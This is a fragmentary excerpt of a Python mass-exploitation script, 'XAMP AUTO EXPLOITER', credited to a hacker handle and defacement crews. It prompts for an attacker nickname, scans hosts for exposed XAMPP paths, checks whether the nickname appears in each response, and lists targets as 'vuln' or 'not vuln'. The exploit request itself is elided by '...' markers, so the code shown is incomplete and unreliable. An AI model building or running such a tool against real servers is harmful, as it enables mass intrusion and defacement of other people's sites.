...
\033[0;33m [*] XAMP AUTO EXPLOITER [*]
     \033[36m C0D3D By : \033[0;33m Dabi 
          \033[36m Pirates Crew - FA Haxor - Rai Haxor - VandaTheGod
""")
...
class mass:
	def __init__(self):
		...
		print ("[*] Nick Dont Using Space, Ex : Dabi_Haxor")
		print ("")
				...
				try:
					...
					if "/xampp" in anggichan:
						...
						if self.nick in iyaaja:
							print ("\033[36m {}  --> vuln" .format(mulus))
							sukses.append(mulus)
						elif self.nick not in iyaaja:
							print ("\033[31m {}  --> not vuln " .format(mulus))
						...
						if self.nick in okein:
							print ("\033[36m {}  --> vuln" .format(kasar))
							sukses.append(kasar)
						elif self.nick not in okein:
							print ("\033[0;33m {}  --> not vuln " .format(kasar))
